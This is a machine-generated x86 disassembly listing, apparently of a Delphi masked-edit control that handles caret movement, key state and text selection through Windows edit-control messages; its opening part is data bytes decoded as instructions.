outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
xchg esp eax
mov [ eax + eax + 0x40 ] 0x44e9
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xb4656c62
pop edx
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
mov ah 0x5a
jb r-xdata
add [ eax + 0x1 ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0xc4287261
push 0x6948776f
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
les edx [ ecx - 0x5617ffb8 ]
dec eax
add [ edx + ebp * 4 + 0x48 ] bh
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xchg ecx eax
inc ebp
add [ eax + eax ] bh
[ eax + ecx * 8 ]
sub [ eax ] al
adc [ eax ] al
or eax 0x3cff0002
sub [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ebx
jns r-xdata
mov ah 0x5a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ah 0x5a
jpe r-xdata
loopne r-xdata
jo r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
je r-xdata
add [ eax + 0x4f070036 ] al
add [ eax ] al
dec edi
jbe r-xdata
add al [ eax ]
add [ ecx + rw-data ] ah
arpl [ ebx + 0x54 ] bp
jpo r-xdata
inc esp
outsd
ja r-xdata
add al dl
add [ eax ] al
call eax
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
mov esi eax
xor edx edx
mov eax esi
call sub_442760
mov al [ r-xdata ]
jge r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_40360c
dec edi
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ esi ] al
dec edi
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
cmp [ ecx + 0x44 ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
push ebx
je r-xdata
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
jb r-xdata
add al bl
add [ eax ] eax
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe947a51c
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
jpo r-xdata
add esp 0xc
add eax 0x0
jb r-xdata
pop [ fs : 0x0 ]
mov [ ebx + ebx * 8 + 0x16e80f74 ] 0x8f
idiv edi
jb r-xdata
mov eax ebx
call sub_48ac9c
mov edx esi
mov cl [ esp ]
mov eax ebx
popad
ja r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090034 ] al
outsb
inc ebp
outsb
mov ebx 0x23c
add [ ebp + 0xc ] dh
nop
push ebx
push esi
test dl dl
je r-xdata
inc esp
outsd
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
call sub_451ee4
test al al
je r-xdata
dec [ ebx + 0x512e8c3 ]
add [ eax ] al
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_48b378
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_48b610
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_48b12c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_48b6e0
sub_48a844
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_451fcc
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_48b12c
sub_48a894
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45209c
mov eax esi
call sub_48ac9c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_48b1a0
mov [ ebx ] 0x0
sub_48a8ec
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e25c
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_48ae74
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_48b12c
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_48a96c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48a9c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48a9d4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404444
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a9cf
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
call sub_4044f8
mov edx eax
mov eax ebx
call sub_44c850
mov eax ebx
call sub_48b12c
sub_48a9e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_48ac9c
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48a9d4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_48baac
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c874
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48aa73
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_48ba64
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40408c
sub_48aa7c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48ab72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_48ac9c
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040d0
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c8a4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_48ba64
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4040d0
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_4899e0
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4040d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ab79
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_48a96c
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_48ab80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48ac9c
test al al
jne r-xdata
mov eax ebx
call sub_442af4
mov dx 0x2e
mov eax ebx
call sub_48b6e0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_48abb4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48ac8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ac95
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
call sub_4359b8
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_4359b8
lea edx [ ebp - 0x4 ]
call sub_435600
call sub_4359b8
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_48ae74
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_48a9d4
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_48c198
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48a96c
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_48c230
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48a96c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_48aebc
sub_48acac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_48a9d4
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_48baac
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_40408c
mov eax esi
call sub_4042f8
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_489770
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_4895f4
mov [ ebx + 0x22c ] al
mov eax esi
call sub_489678
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_48ba64
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4040d0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_48a96c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ad68
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40405c
retn
sub_48ad70
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_404444
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_48acac
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_48ae74
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_442888
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_48a96c
mov eax ebx
call sub_4533bc
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_4530b8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_442888
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_48aebc
sub_48ae44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48ac9c
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_442888
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_442888
pop esi
pop ebx
retn
sub_48ae74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_48ae98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_48aebc
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48b11c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_48ac9c
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_48a9d4
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40c38c
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_48a9d4
mov eax [ ebp - 0x218 ]
call sub_4042f8
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_48a9d4
mov eax [ ebp - 0x210 ]
call sub_4042f8
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48ae98
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_48a9d4
mov eax [ ebp - 0x21c ]
call sub_4042f8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_48a9d4
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48ae98
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b123
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_40405c
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_4034a4
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_48b08a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_4034a4
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_4034a4
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_48b12c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_48ae74
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_48aebc
sub_48b178
push ebx
mov ebx eax
mov eax ebx
call sub_4428cc
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_48a96c
xor edx edx
mov eax ebx
call sub_442904
sub_48b1a0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_48b365
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b36c
lea eax [ ebp - 0x10 ]
call sub_404038
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_48ae74
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_48b6e0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_48b5b4
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_48aebc
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_48bc80
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_4530b8
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_404220
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402ba0
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402b70
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_40429c
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_48ae98
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_4044f8
push eax
push 0x0
push 0xc2
mov eax esi
call sub_4530b8
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_48ae74
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_48b560
sub_48b378
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#4
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b559
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_48ae74
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48b598
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_48a9d4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48ae98
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_48a9d4
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48aebc
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_48aebc
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_48ae98
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48b560
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48b560
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48b560
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48b598
jmp r-xdata
sub_48b560
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_48b5b4
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_489820
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_48aebc
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_48b5b4
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_489820
test al al
jne r-xdata
inc ebx
sub_48b5dc
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_489820
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_48b5b4
mov ebx eax
dec ebx
sub_48b610
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_48ae74
cmp si 0x24
